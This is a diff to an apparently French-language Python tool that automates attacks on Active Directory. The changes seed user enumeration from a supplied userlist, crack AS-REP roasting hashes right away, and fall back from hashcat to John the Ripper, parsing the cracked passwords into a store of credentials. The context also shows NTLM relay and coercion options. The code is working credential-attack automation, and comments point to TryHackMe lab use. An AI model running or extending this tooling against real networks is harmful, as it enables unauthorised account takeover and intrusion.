@@ -503,6 +503,15 @@ def phase1_unauth(hosts, args, state):
     nxc = nxc_bin()
     users = set()
 
+    # userlist fournie (ex: THM Attacktive Directory ou l'OSINT) -> seed
+    if getattr(args, "userlist", None) and os.path.isfile(args.userlist):
+        with open(args.userlist, encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                u = line.strip()
+                if u and not u.startswith("#"):
+                    users.add(u.split("@")[0].split("\\")[-1])
+        log(f"{C.GR}[i] Userlist chargee : {len(users)} utilisateur(s) (seed).{C.X}")
+
     # surface de relais/coercion (depuis phase 0)
     for ip, r in hosts.items():
         if r.get("smb_signing_required") is False:
@@ -589,6 +598,9 @@ def phase1_unauth(hosts, args, state):
 
     # AS-REP roasting (sans creds)
     phase_asrep(dc, args, state, label="non-auth")
+    # l'AS-REP est un gain SANS creds -> on crack tout de suite (nourrit la suite)
+    if state.get("hashes"):
+        crack_hashes(args, state)
 
 def phase_asrep(dc, args, state, label=""):
     """AS-REP roasting : comptes DONT_REQ_PREAUTH -> hash crackable."""
@@ -1209,19 +1221,31 @@ def crack_hashes(args, state):
         if not os.path.isfile(path):
             continue
         mode = modes.get(kind, None)
-        log(f"{C.GR}[i] Crack {kind} (hashcat -m {mode}) avec {os.path.basename(wl)}...{C.X}")
+        cracked = ""
+        # 1) hashcat (GPU/CPU) si dispo
         if have("hashcat") and mode:
-            run_cmd(["hashcat", "-m", mode, path, wl, "--quiet"], args.crack_timeout)
-            rc, out, _ = run_cmd(["hashcat", "-m", mode, path, "--show"], 120)
-        else:
+            log(f"{C.GR}[i] Crack {kind} (hashcat -m {mode}) avec {os.path.basename(wl)}...{C.X}")
+            run_cmd(["hashcat", "-m", mode, path, wl, "--quiet", "--force"], args.crack_timeout)
+            rc, out, _ = run_cmd(["hashcat", "-m", mode, path, "--show", "--force"], 120)
+            cracked = out
+        # 2) fallback John (CPU) si hashcat n'a rien sorti (ex: pas de GPU/OpenCL en VM)
+        if not cracked.strip() and have("john"):
+            log(f"{C.GR}[i] Crack {kind} via John (CPU)...{C.X}")
             run_cmd(["john", f"--wordlist={wl}", path], args.crack_timeout)
             rc, out, _ = run_cmd(["john", "--show", path], 120)
-        for line in out.splitlines():
-            if ":" not in line:
+            cracked = out
+        for line in cracked.splitlines():
+            line = line.strip()
+            if ":" not in line or re.search(
+                    r"password hash|Loaded|Session|Proceeding|Warning|No password|Use the", line, re.I):
                 continue
             pw = line.rsplit(":", 1)[-1].strip()
             user = _extract_cracked_user(line)
-            if user and pw and 0 < len(pw) < 60:
+            if not user:   # format John 'login:password' -> prend le login
+                head = line.split(":", 1)[0].strip()
+                if re.match(r"^[A-Za-z0-9._$-]{1,64}$", head) and "$krb5" not in head:
+                    user = head.rstrip("$")
+            if user and pw and 0 < len(pw) < 60 and "$krb5" not in pw:
                 cred = {"user": user, "password": pw, "hash": None, "src": kind}
                 if not any(c.get("user") == user and c.get("password") == pw
                            for c in state.get("creds", [])):
@@ -1672,6 +1696,7 @@ def main():
     p.add_argument("--relay", action="store_true",
                    help="Tenter coercion + ntlmrelayx (actif, requiert --yes + --lhost)")
     p.add_argument("--lhost", help="IP de l'attaquant (pour le relais NTLM)")
+    p.add_argument("--userlist", help="Liste d'utilisateurs a tester (seed phase 1 ; ex: userlist THM)")
     p.add_argument("--wordlist", help="Wordlist pour le crack auto (defaut: rockyou si present)")
     p.add_argument("--crack-timeout", type=int, default=900, help="Timeout crack hashcat/john (defaut 900s)")
     p.add_argument("-t", "--threads", type=int, default=100, help="Threads scan (defaut 100)")
